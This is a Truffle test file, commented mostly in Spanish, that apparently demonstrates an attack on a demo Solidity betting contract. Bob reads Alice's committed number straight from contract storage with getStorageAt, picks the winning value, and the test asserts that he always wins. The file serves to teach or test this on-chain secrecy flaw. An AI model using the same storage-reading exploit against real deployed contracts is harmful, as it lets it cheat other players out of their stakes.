const expect = require('chai').expect;

const AliceJson = artifacts.require('Game');

contract('Game', accounts=>{
    [alice, bob, charlie] = accounts;
    let aliceInstance;
    before(async function() {
        aliceInstance = await AliceJson.new();
    });

    context('hackeo a player 1', async () => {

        it('El jugador 1 mete 1 valor', async () => {
            // Este es el valor que mete siempre alice para jugar
            // This is the value Alice always puts in to play
            let number=309;
            await aliceInstance.registerGamble(number,{from: alice , value: '1000000000000000000'});
        });

        it('El jugador 2 mete siempre el valor ganador', async () => {
            // bob analizando el código ve que el numero de alice va a estar en la segunda posicion del storage (la numero 1 debido a que empieza en 0). En 0 estará la cuenta de alice
            result= await web3.eth.getStorageAt(aliceInstance.address, 1);

            //bob calcula que numero lo hará ganar
            if(result%2)
            {
                number=1;
            }
            else{
                number=2;
            }
            //juega el numero previamente calculado
            await aliceInstance.registerGamble(number,{from: bob , value: '1000000000000000000'});
        });

        it('ganador es bob', async () => {
            // esta llamada es unicamente para probar que el ganador siempre es bob
            let winner = await aliceInstance.winner();
            expect(winner).to.equal(bob);
        });        

    });
});